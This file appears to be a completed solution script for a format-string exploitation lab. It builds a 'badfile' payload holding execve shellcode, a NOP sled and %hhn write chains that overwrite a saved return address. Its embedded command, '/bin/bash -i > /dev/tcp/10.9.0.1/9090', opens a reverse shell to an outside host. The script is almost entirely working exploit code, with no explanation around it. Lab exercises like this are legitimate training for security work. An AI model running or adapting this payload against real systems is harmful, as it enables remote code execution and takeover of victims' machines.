#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   # "/bin/ls -l; echo '===== Success! ======'                  *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   # "/bin/ls -l; echo '===== Success! ======'                  *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = 0x100               # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################
#
#    Construct the format string here
#

# change the ret addr into somewhere in buf (e.g., 0x00007fffffffe4b0 + 0x100)
fmt  = ("%{}c%{}$hhn").format(0x7f, 42).encode('latin-1')
fmt += ("%{}c%{}$hhn").format(0xff-0x7f, 43).encode('latin-1')
fmt += ("%{}$hhn").format(44).encode('latin-1')
fmt += ("%{}$hhn").format(45).encode('latin-1')
fmt += ("%{}c%{}$hhn").format(0x1e5 - 0xff, 46).encode('latin-1')
fmt += ("%{}c%{}$hhn").format(0x2b0 - 0x1e5, 47).encode('latin-1')
fmt += ("%c").encode('latin-1')  # supply to 64 bytes length(8 arg len)
content[0:len(fmt)] = fmt

l = len(fmt)
print("format string len: ", l)

# put the zero-contained content behind the key format string
number  = 0x00007fffffffe3f0 + 8  # addr of the ret addr
content[l:l+8]     = (number+5).to_bytes(8,byteorder='little')
content[l+8:l+16]  = (number+4).to_bytes(8,byteorder='little')
content[l+16:l+24] = (number+3).to_bytes(8,byteorder='little')
content[l+24:l+32] = (number+2).to_bytes(8,byteorder='little')
content[l+32:l+40] = (number+1).to_bytes(8,byteorder='little')
content[l+40:l+48] = (number).to_bytes(8,byteorder='little')

############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
